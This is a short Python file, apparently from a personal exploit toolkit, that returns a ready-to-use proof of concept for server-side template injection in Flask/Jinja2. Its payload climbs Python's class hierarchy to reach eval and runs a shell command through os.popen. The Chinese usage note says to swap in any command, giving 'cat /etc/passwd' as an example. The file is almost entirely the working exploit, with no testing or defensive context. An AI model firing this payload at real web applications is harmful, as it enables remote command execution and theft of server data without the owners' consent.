# -*- coding:utf-8 -*-
#@Time : 2020/4/24 1:06
#@Author: Triomphe
#@File : flask_ssti.py


def get_poc_info():
    poc_info = {
        "name": "flask SSTI服务器端注入攻击",
        "use_info":"popen中的参数就是执行的命令,例如cat /etc/passwd",
        "POC":"""
        {% for c in [].__class__.__base__.__subclasses__() %}
        {% if c.__name__ == 'catch_warnings' %}
        {% for b in c.__init__.__globals__.values() %}
        {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %}
        {{ b['eval']('__import__("os").popen("id").read()') }}
        {% endif %}
        {% endif %}
        {% endfor %}
        {% endif %}
        {% endfor %}
        """
    }
    return poc_info
